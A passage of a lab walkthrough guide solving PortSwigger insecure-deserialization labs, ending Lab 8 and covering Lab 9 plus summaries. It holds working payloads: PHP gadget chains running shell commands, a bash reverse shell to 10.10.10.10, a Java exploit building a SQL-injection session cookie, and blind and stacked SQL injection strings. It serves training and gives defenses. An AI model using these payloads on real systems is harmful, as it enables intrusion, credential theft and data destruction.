require 'CustomTemplate.php';
require 'DefaultMap.php';

$payload = "BASE64_PAYLOAD_HERE";
$decoded = base64_decode($payload);

echo "Deserializing...\n";
$obj = unserialize($decoded);
echo "Deserialization complete\n";
?>
```

#### 9. Inject the Payload

1. Open Burp Suite Repeater
2. Send any authenticated request
3. Replace the session cookie with the generated Base64 payload
4. Send the request
5. Lab solved!

### Understanding Magic Method Chaining

**Execution flow breakdown:**

```php
// Step 1: unserialize() is called
unserialize($payload)

// Step 2: CustomTemplate::__wakeup() automatically triggered
function __wakeup() {
    $this->desc = new Description();  // Replaced with our DefaultMap object
    $this->desc->$this->default_desc_type = new Product();  // Triggers __get()
    $this->desc->$this->default_desc_type = $this->product->desc;  // Not reached
}

// Step 3: Since $this->desc is DefaultMap (not Description)
//         and default_desc_type = "rm /home/carlos/morale.txt"
//         accessing $this->desc->{"rm /home/carlos/morale.txt"} triggers:
function __get($name) {  // $name = "rm /home/carlos/morale.txt"
    return call_user_func($this->callback, $name);  // exec("rm /home/carlos/morale.txt")
}
```

### Burp Suite Features Used

- **Proxy:** Intercept requests to identify backup files
- **Repeater:** Request backup files and inject payloads
- **Decoder:** Base64 encode/decode operations
- **Intruder:** Enumerate backup file locations (optional)

### HTTP Request Example

```http
GET /my-account HTTP/1.1
Host: vulnerable-website.com
Cookie: session=TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjM6e3M6MzM6IgBDdXN0b21UZW1wbGF0ZQBkZWZhdWx0X2Rlc2NfdHlwZSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO3M6MjA6IgBDdXN0b21UZW1wbGF0ZQBkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjIwOiIARGVmYXVsdE1hcABjYWxsYmFjayI7czo0OiJleGVjIjt9czo3OiJwcm9kdWN0IjtPOjc6IlByb2R1Y3QiOjE6e3M6NDoiZGVzYyI7czo0OiJ0ZXN0Ijt9fQ==
```

### Common Mistakes & Troubleshooting

❌ **Incorrect null byte handling** - Private properties need `\x00ClassName\x00PropertyName`
❌ **Wrong string lengths** - Count null bytes in property names
❌ **Class name mismatches** - Ensure class names match exactly (case-sensitive)
❌ **Property count errors** - Count all properties accurately
❌ **Not finding all source files** - Try multiple backup file extensions
❌ **Assuming property types** - Check if properties are public/private/protected

### Alternative Commands

**File read:**
```php
$this->default_desc_type = "cat /home/carlos/morale.txt";
$this->callback = "system";
```

**Reverse shell:**
```php
$this->default_desc_type = "bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'";
$this->callback = "system";
```

**Alternative PHP functions:**
- `exec()` - Executes command, returns last line
- `system()` - Executes command, outputs result
- `passthru()` - Executes command, outputs raw result
- `shell_exec()` - Executes command, returns full output
- `popen()` - Opens a pipe to a process

### Finding Gadget Chains: Methodology

1. **Identify entry points:**
   - Look for `__wakeup()`, `__destruct()`, `__toString()` magic methods

2. **Follow the data flow:**
   - What properties are accessed?
   - What methods are called?
   - Are there dynamic property accesses?

3. **Find exploitable sinks:**
   - Look for `call_user_func()`, `call_user_func_array()`
   - File operations: `unlink()`, `file_get_contents()`, `include()`
   - Code execution: `eval()`, `assert()`, `create_function()`
   - Command execution: `exec()`, `system()`, `passthru()`

4. **Chain them together:**
   - Start with an entry point (magic method)
   - Navigate through intermediate objects
   - Reach an exploitable sink

### Real-World Gadget Chain Analysis

**Example: WordPress POP chain (simplified)**

```php
// Entry point
class WP_Hook {
    function __wakeup() {
        // Processes callbacks array
        foreach ($this->callbacks as $priority => $callbacks) {
            foreach ($callbacks as $callback) {
                call_user_func_array($callback['function'], array());
            }
        }
    }
}

// Exploitation
$exploit = new WP_Hook();
$exploit->callbacks = array(
    1 => array(
        array('function' => 'system'),
        array('args' => 'rm /tmp/target')
    )
);
```

### Defense Mechanisms

✅ **Remove backup files from production:**
```bash
find /var/www -name "*.php~" -delete
find /var/www -name "*.bak" -delete
find /var/www -name "*.old" -delete
find /var/www -name "*.swp" -delete
```

✅ **Disable backup file creation:**
```apache
# .htaccess
<FilesMatch "\.(php~|bak|old|swp)$">
    Require all denied
</FilesMatch>
```

✅ **Avoid dangerous magic methods:**
```php
// Bad
class Unsafe {
    function __wakeup() {
        call_user_func($this->callback);
    }
}

// Better
// Don't deserialize untrusted data at all
```

✅ **Use typed properties (PHP 7.4+):**
```php
class Safe {
    private string $desc_type;  // Can only be string
    private Description $desc;   // Can only be Description object
}
```

✅ **Implement `__wakeup()` validation:**
```php
public function __wakeup() {
    // Validate object state after deserialization
    if (!$this->desc instanceof Description) {
        throw new Exception("Invalid deserialization");
    }
}
```

✅ **Use `allowed_classes` option:**
```php
$obj = unserialize($data, ['allowed_classes' => ['User', 'Session']]);
```

### Automated Gadget Chain Discovery

**Tools:**
1. **PHPGGC** - Pre-built chains
2. **php-object-injection** - Scanner
3. **Gad-check** - Custom gadget finder

**Manual techniques:**
```bash
# Find all __wakeup methods
grep -r "__wakeup" /var/www/html/

# Find call_user_func usage
grep -r "call_user_func" /var/www/html/

# Find __get methods
grep -r "__get" /var/www/html/

# Find all magic methods
grep -r "function __" /var/www/html/
```

### Key Takeaways

- Custom gadget chains require source code analysis
- Magic methods are entry points for exploitation
- `call_user_func()` is a powerful exploitation primitive
- Private properties can be set during deserialization
- Chaining multiple objects amplifies exploitation potential
- Backup files are a critical information disclosure vector
- Building custom gadget chains demonstrates deep understanding
- Even "secure" applications can be vulnerable through gadget chaining
- Defense requires removing dangerous patterns, not just input validation
- Expert-level exploitation combines multiple techniques and deep code analysis

---

## Lab 9: Developing a custom gadget chain for Java deserialization

**Difficulty:** Expert
**Link:** https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization

### Description

This lab uses a serialization-based session mechanism. If you can construct a suitable gadget chain, you can exploit this lab's insecure deserialization to obtain the administrator's password. Then, you can log in as the administrator and delete Carlos's account.

To solve the lab, gain access to the source code and use it to construct a gadget chain to obtain the administrator's password. Then, log in as the administrator and delete the user carlos.

### Credentials

- Username: `wiener`
- Password: `peter`

### Vulnerability Details

This expert-level lab requires building a custom Java gadget chain by analyzing the application's source code. The gadget chain combines deserialization exploitation with SQL injection to extract the administrator's password from the database.

### Step-by-Step Solution

#### 1. Login and Identify Serialization

1. Login with credentials `wiener:peter`
2. Capture the session cookie in Burp Suite
3. Identify Java serialization (cookie starts with `rO0`)

#### 2. Obtain Source Code

Try common backup file patterns and source code exposure:

**Backup files:**
```http
GET /backup/Main.java HTTP/1.1
GET /backup/AccessTokenUser.java HTTP/1.1
GET /backup/ProductTemplate.java HTTP/1.1
```

**Alternative approaches:**
- Check for `.git` directory exposure: `GET /.git/HEAD`
- Look for source maps or debug symbols
- Check error messages for file paths
- Look for commented-out code in responses

#### 3. Analyze Source Code

Let's say we find these source files:

**AccessTokenUser.java:**
```java
package data.session.token;

import java.io.Serializable;

public class AccessTokenUser implements Serializable {
    private final String username;
    private final String accessToken;

    public AccessTokenUser(String username, String accessToken) {
        this.username = username;
        this.accessToken = accessToken;
    }

    public String getUsername() {
        return username;
    }

    public String getAccessToken() {
        return accessToken;
    }
}
```

**ProductTemplate.java:**
```java
package data.productcatalog;

import common.db.JdbcConnectionBuilder;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

public class ProductTemplate implements Serializable {
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id) {
        this.id = id;
    }

    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException {
        inputStream.defaultReadObject();

        JdbcConnectionBuilder connectionBuilder = JdbcConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "password"
        ).withAutoCommit();

        try {
            Connection connect = connectionBuilder.connect(30);
            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
            Statement statement = connect.createStatement();
            ResultSet resultSet = statement.executeQuery(sql);

            if (!resultSet.next()) {
                return;
            }

            product = Product.from(resultSet);
        } catch (SQLException e) {
            throw new IOException(e);
        }
    }

    public String getId() {
        return id;
    }

    public Product getProduct() {
        return product;
    }
}
```

**Key vulnerability identified:**

```java
String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
```

The `id` field is directly interpolated into the SQL query without sanitization! This is a SQL injection vulnerability that's triggered during deserialization.

#### 4. Plan the Exploitation

**Strategy:**
1. Create a `ProductTemplate` object with a malicious `id`
2. The `id` contains SQL injection payload
3. During deserialization, `readObject()` is called automatically
4. SQL injection executes, extracting the administrator's password
5. Use error-based SQL injection to display the password in an exception

**SQL Injection technique: PostgreSQL error-based injection**

```sql
' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users WHERE username='administrator'--
```

This will:
- Close the original query with `'`
- Use UNION to select from the `users` table
- Cast the password (string) to numeric (integer)
- Cause a type conversion error that displays the password
- Filter for the administrator user
- Comment out the rest with `--`

#### 5. Determine Column Count

First, we need to find how many columns the products table has:

**Test payloads:**
```sql
' UNION SELECT NULL--                    (1 column - test)
' UNION SELECT NULL, NULL--              (2 columns - test)
' UNION SELECT NULL, NULL, NULL--        (3 columns - test)
...
' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--  (8 columns - success!)
```

We discover the products table has 8 columns.

#### 6. Identify String Columns

Test which columns accept string data:

```sql
' UNION SELECT 'a', NULL, NULL, NULL, NULL, NULL, NULL, NULL--    (column 1)
' UNION SELECT NULL, 'a', NULL, NULL, NULL, NULL, NULL, NULL--    (column 2)
' UNION SELECT NULL, NULL, 'a', NULL, NULL, NULL, NULL, NULL--    (column 3)
' UNION SELECT NULL, NULL, NULL, 'a', NULL, NULL, NULL, NULL--    (column 4 - error!)
```

Columns 4, 5, and 6 don't accept string types.

#### 7. Craft the Final Payload

**SQL injection payload:**
```sql
' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users WHERE username='administrator'--
```

**Why this works:**
- PostgreSQL will try to cast the password string to a number
- This will fail because the password contains letters
- The error message will include the actual password value
- Example error: `ERROR: invalid input syntax for type numeric: "password123"`

#### 8. Create the Malicious Java Object

**Exploit.java:**
```java
import java.io.*;
import java.util.Base64;

class ProductTemplate implements Serializable {
    private final String id;

    public ProductTemplate(String id) {
        this.id = id;
    }
}

public class Exploit {
    public static void main(String[] args) throws Exception {
        // SQL injection payload
        String payload = "' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users WHERE username='administrator'--";

        // Create malicious object
        ProductTemplate pt = new ProductTemplate(payload);

        // Serialize
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(pt);
        oos.close();

        // Base64 encode
        byte[] serialized = baos.toByteArray();
        String encoded = Base64.getEncoder().encodeToString(serialized);

        System.out.println(encoded);
    }
}
```

**Compile and run:**
```bash
javac Exploit.java
java Exploit
```

#### 9. Inject the Payload

1. Copy the Base64 output
2. Open Burp Suite Repeater
3. Send any authenticated request
4. Replace the session cookie with the payload
5. Send the request

#### 10. Extract the Password from Error

**Expected response:**
```
HTTP/1.1 500 Internal Server Error
...
java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type numeric: "vh9jkr7t82l5bqp3cnuy"
...
```

The administrator's password is: **vh9jkr7t82l5bqp3cnuy** (example)

#### 11. Login as Administrator

1. Navigate to the login page
2. Username: `administrator`
3. Password: `vh9jkr7t82l5bqp3cnuy`
4. Login successful!

#### 12. Delete User Carlos

1. Navigate to admin panel
2. Click "Delete" next to user carlos
3. Lab solved!

### Understanding readObject() Exploitation

**Why readObject() is dangerous:**

```java
private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException {
    inputStream.defaultReadObject();  // Restore object state

    // Custom deserialization logic
    // This code runs automatically during deserialization!
    Connection connect = connectionBuilder.connect(30);
    String sql = String.format("SELECT * FROM products WHERE id = '%s'", id);
    statement.executeQuery(sql);  // SQL injection here!
}
```

**Key points:**
1. `readObject()` is called automatically by `ObjectInputStream.readObject()`
2. It can contain arbitrary code that executes during deserialization
3. Object fields (like `id`) are restored before `readObject()` executes
4. This allows attacker-controlled data to influence application logic

### PostgreSQL Error-Based SQL Injection Techniques

**Method 1: Type casting error**
```sql
CAST(password AS numeric)  -- Fails if password contains non-numeric characters
```

**Method 2: Division by zero**
```sql
1/0  -- Always throws error
```

**Method 3: Array index out of bounds**
```sql
(SELECT password FROM users LIMIT 1) OFFSET 0  -- Complex, but works
```

**Method 4: XML injection (PostgreSQL specific)**
```sql
xmlparse(document '<?xml version="1.0"?><root>' || password || '</root>')
```

### Burp Suite Workflow

1. **Identify Java serialization:**
   - Inspector → Check session cookie
   - Look for `rO0` prefix

2. **Obtain source code:**
   - Repeater → Request `/backup/*.java`
   - Try multiple file names
   - Check for Git exposure

3. **Analyze for vulnerabilities:**
   - Look for `readObject()` methods
   - Identify SQL queries, file operations, etc.
   - Check for string formatting/concatenation

4. **Test SQL injection:**
   - Repeater → Test column count
   - Identify data types
   - Craft error-based payload

5. **Generate Java payload:**
   - External: Compile and run exploit
   - Copy Base64 output

6. **Extract password:**
   - Repeater → Inject payload
   - Read password from error message

7. **Complete exploitation:**
   - Login as administrator
   - Delete target user

### HTTP Request Examples

**Step 1: Injecting the payload**
```http
GET /my-account HTTP/1.1
Host: vulnerable-website.com
Cookie: session=rO0ABXNyACRkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAoScgVU5JT04gU0VMRUNUIE5VTEwsIE5VTEwsIE5VTEwsIENBU1QocGFzc3dvcmQgQVMgbnVtZXJpYyksIE5VTEwsIE5VTEwsIE5VTEwsIE5VTEwgRlJPTSB1c2VycyBXSEVSRSB1c2VybmFtZT0nYWRtaW5pc3RyYXRvcictLQ==
```

**Step 2: Logging in**
```http
POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded

username=administrator&password=vh9jkr7t82l5bqp3cnuy
```

**Step 3: Deleting carlos**
```http
POST /admin/delete HTTP/1.1
Host: vulnerable-website.com
Cookie: session=<valid_admin_session>

username=carlos
```

### Common Mistakes & Troubleshooting

❌ **Wrong column count** - Must match exactly with UNION SELECT
❌ **Wrong data types** - String columns can't use CAST(password AS numeric)
❌ **Incorrect SQL syntax** - PostgreSQL syntax differs from MySQL
❌ **Not URL-encoding cookie** - Some applications require this
❌ **Forgetting the comment** - SQL injection payload must end with `--` or `#`
❌ **Class path issues** - Ensure package names match in exploit code
❌ **Serialization UID mismatch** - May need to specify correct serialVersionUID

### Alternative SQL Injection Techniques

**Time-based blind SQL injection:**
```sql
'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
```

**Boolean-based blind SQL injection:**
```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
```

**UNION-based data extraction (if no error):**
```sql
' UNION SELECT username, password, NULL, NULL, NULL, NULL, NULL, NULL FROM users--
```

**Stacked queries (PostgreSQL):**
```sql
'; UPDATE users SET password='hacked' WHERE username='administrator'--
```

### Real-World Impact

**Famous Java deserialization vulnerabilities:**

- **CVE-2015-4852:** Oracle WebLogic RCE
- **CVE-2015-7501:** JBoss JMXInvokerServlet RCE
- **CVE-2017-5638:** Apache Struts 2 RCE (Equifax breach)
- **CVE-2017-3066:** Adobe ColdFusion RCE
- **CVE-2018-1000129:** Jolokia deserialization RCE
- **CVE-2019-2729:** Oracle WebLogic wls9_async RCE
- **CVE-2020-2555:** Oracle Coherence deserialization RCE
- **CVE-2021-21345:** XStream RCE

### Defense Mechanisms

✅ **Never deserialize untrusted data**
✅ **Use ObjectInputFilter (Java 9+):**
```java
ObjectInputStream ois = new ObjectInputStream(input);
ois.setObjectInputFilter(info -> {
    Class<?> clazz = info.serialClass();
    if (clazz != null) {
        String className = clazz.getName();
        // Allow only specific classes
        if (className.startsWith("data.session.")) {
            return ObjectInputFilter.Status.ALLOWED;
        }
    }
    return ObjectInputFilter.Status.REJECTED;
});
```

✅ **Avoid dangerous readObject() patterns:**
```java
// Bad
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
    in.defaultReadObject();
    String sql = "SELECT * FROM users WHERE id = " + this.id;  // SQL injection
    statement.executeQuery(sql);
}

// Better
// Don't perform database operations in readObject()
```

✅ **Use parameterized queries:**
```java
String sql = "SELECT * FROM products WHERE id = ?";
PreparedStatement statement = connection.prepareStatement(sql);
statement.setString(1, id);
ResultSet resultSet = statement.executeQuery();
```

✅ **Validate object state after deserialization:**
```java
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
    in.defaultReadObject();

    // Validate deserialized data
    if (id == null || id.contains("'") || id.contains("--")) {
        throw new InvalidObjectException("Invalid id");
    }
}
```

✅ **Use safe serialization alternatives:**
- JSON (Jackson, Gson)
- Protocol Buffers
- Apache Avro
- MessagePack

✅ **Implement SecurityManager (deprecated in Java 17):**
```java
System.setSecurityManager(new SecurityManager() {
    @Override
    public void checkPermission(Permission perm) {
        // Restrict file access, network access, etc.
    }
});
```

✅ **Use serialization proxies:**
```java
private Object writeReplace() {
    return new SerializationProxy(this);
}

private static class SerializationProxy implements Serializable {
    // Serialize only safe data
}
```

### Building Custom Gadget Chains: Methodology

**1. Find source/entry point:**
- Look for `readObject()`, `readResolve()`, `readExternal()`
- These are automatically called during deserialization

**2. Follow the execution flow:**
- What methods are called?
- What fields are accessed?
- Are there reflection calls?

**3. Identify sinks:**
- SQL queries (SQL injection)
- File operations (path traversal, file write)
- Network operations (SSRF)
- Command execution
- Code evaluation

**4. Chain multiple classes:**
- One class's `readObject()` creates another object
- That object's method performs the dangerous operation
- Example: `readObject()` → `toString()` → `exec()`

**Example gadget chain structure:**
```
EntryPoint.readObject()
  → creates MiddleObject
  → MiddleObject.toString() called
  → invokes DangerousSink.exec()
```

### Source Code Discovery Techniques

**1. Backup files:**
```
/backup/*.java
/src/*.java
/*.java.bak
/*.java~
```

**2. Git exposure:**
```
/.git/HEAD
/.git/index
/.git/objects/
```

**3. Debug symbols:**
```
/WEB-INF/classes/*.class
/META-INF/
```

**4. Error messages:**
```
Trigger exceptions to see:
- File paths
- Class names
- Stack traces
```

**5. Decompilation:**
```bash
# Download .class files
# Decompile with JD-GUI or procyon
java -jar procyon.jar MyClass.class
```

### Key Takeaways

- Custom Java gadget chains require source code access and analysis
- `readObject()` methods are powerful entry points for exploitation
- SQL injection can be triggered during deserialization
- Error-based SQL injection is effective for data extraction
- Multiple vulnerabilities can be chained for greater impact
- PostgreSQL type casting errors leak data in error messages
- Expert exploitation requires combining multiple attack techniques
- Defense requires eliminating dangerous deserialization patterns entirely
- Never trust deserialized data, even in internal methods
- Java deserialization remains a critical vulnerability in enterprise applications

---

## Summary Statistics

### Lab Breakdown by Difficulty

| Difficulty | Count | Lab Numbers |
|------------|-------|-------------|
| Apprentice | 1 | Lab 1 |
| Practitioner | 6 | Labs 2-7 |
| Expert | 2 | Labs 8-9 |
| **Total** | **9** | |

### Lab Breakdown by Language/Technology

| Language/Framework | Count | Lab Numbers |
|--------------------|-------|-------------|
| PHP | 5 | Labs 1-4, 6, 8 |
| Java | 2 | Labs 5, 9 |
| Ruby/Rails | 1 | Lab 7 |
| Language-agnostic | 1 | Lab 3 |

### Key Vulnerability Types Covered

1. **Direct object manipulation** (Lab 1)
2. **Type juggling** (Lab 2)
3. **Application functionality abuse** (Lab 3)
4. **Arbitrary object injection** (Lab 4)
5. **Pre-built gadget chains** (Labs 5-7)
6. **Custom gadget chain development** (Labs 8-9)
7. **Magic method exploitation** (Labs 4, 6, 7, 8)
8. **SQL injection via deserialization** (Lab 9)

### Attack Progression

```
Basic → Intermediate → Advanced → Expert
  ↓         ↓             ↓         ↓
Lab 1   Labs 2-4     Labs 5-7   Labs 8-9
  ↓         ↓             ↓         ↓
Simple   Object     Pre-built   Custom
Modify   Injection   Gadgets    Gadgets
```

---

## Completion Time Estimates

| Lab | Difficulty | Estimated Time | With Experience |
|-----|------------|----------------|-----------------|
| 1 | Apprentice | 10-15 min | 2-3 min |
| 2 | Practitioner | 15-20 min | 3-5 min |
| 3 | Practitioner | 20-25 min | 5-7 min |
| 4 | Practitioner | 25-30 min | 5-10 min |
| 5 | Practitioner | 30-40 min | 10-15 min |
| 6 | Practitioner | 40-60 min | 15-20 min |
| 7 | Practitioner | 30-45 min | 10-15 min |
| 8 | Expert | 60-90 min | 20-30 min |
| 9 | Expert | 90-120 min | 30-45 min |

---

## Tools Required

1. **Burp Suite Professional** (or Community Edition)
   - Proxy, Repeater, Decoder, Inspector, Intruder

2. **ysoserial** (Java deserialization tool)
   ```bash
   wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
   ```

3. **PHPGGC** (PHP gadget chain generator)
   ```bash
   git clone https://github.com/ambionics/phpggc.git
   ```

4. **Programming environment:**
   - PHP CLI
   - Ruby interpreter
   - Java JDK

5. **Command-line utilities:**
   - Base64 encoder/decoder
   - Text editor
   - Terminal/shell

---

## Resources for Further Learning

- **PortSwigger Web Security Academy:** https://portswigger.net/web-security/deserialization
- **OWASP Deserialization Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
- **ysoserial GitHub:** https://github.com/frohoff/ysoserial
- **PHPGGC GitHub:** https://github.com/ambionics/phpggc
- **Ruby Deserialization Research:** https://www.elttam.com/blog/ruby-deserialization/
- **Java Deserialization Vulnerabilities:** https://www.youtube.com/watch?v=VviY3O-euVQ

---

*This comprehensive guide covers all PortSwigger Insecure Deserialization labs with detailed solutions, exploitation techniques, and defensive strategies.*
